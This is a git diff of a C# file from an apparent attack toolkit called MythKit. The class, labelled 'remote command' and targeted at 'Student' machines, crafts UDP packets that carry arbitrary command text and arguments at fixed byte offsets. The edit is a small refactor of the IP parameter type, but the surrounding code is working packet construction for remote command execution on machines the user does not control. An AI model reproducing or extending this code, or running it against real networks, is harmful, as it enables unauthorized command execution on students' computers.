@@ -1,6 +1,7 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.IO;
+using System.Net;
 using System.Text;
 using System.Windows.Controls;
 
@@ -20,7 +21,7 @@ namespace MythKit.Pages.UDPAttack.AttackFunctions
         public string AttackName => "远程命令";
         public string AttackId => "remote_command";
         public AttackTarget Target => AttackTarget.Student;
-        public AttackPacket ConstructPacket(ref string message, string ip, int cycleCount, int groupCount)
+        public AttackPacket ConstructPacket(ref string message, IPAddress ip, int cycleCount, int groupCount)
         {
             byte[] packet;
             using (MemoryStream memoryStream = new MemoryStream())
@@ -49,7 +50,7 @@ namespace MythKit.Pages.UDPAttack.AttackFunctions
                 memoryStream.Write(payloadBytes, 0, payloadBytes.Length);
 
                 // Command text bytes
-                byte[] commandBytes = Encoding.Unicode.GetBytes(AttackPacket.FormatString(Command.Text, ip, cycleCount, groupCount));
+                byte[] commandBytes = Encoding.Unicode.GetBytes(AttackPacket.FormatString(Command.Text, ip.ToString(), cycleCount, groupCount));
                 memoryStream.Write(commandBytes, 0, commandBytes.Length);
 
                 // Padding to 572 bytes
@@ -65,7 +66,7 @@ namespace MythKit.Pages.UDPAttack.AttackFunctions
                 }
 
                 // Arguments text bytes
-                byte[] argumentBytes = Encoding.Unicode.GetBytes(AttackPacket.FormatString(Arguments.Text, ip, cycleCount, groupCount));
+                byte[] argumentBytes = Encoding.Unicode.GetBytes(AttackPacket.FormatString(Arguments.Text, ip.ToString(), cycleCount, groupCount));
                 memoryStream.Write(argumentBytes, 0, argumentBytes.Length);
 
                 // Padding to 906 bytes
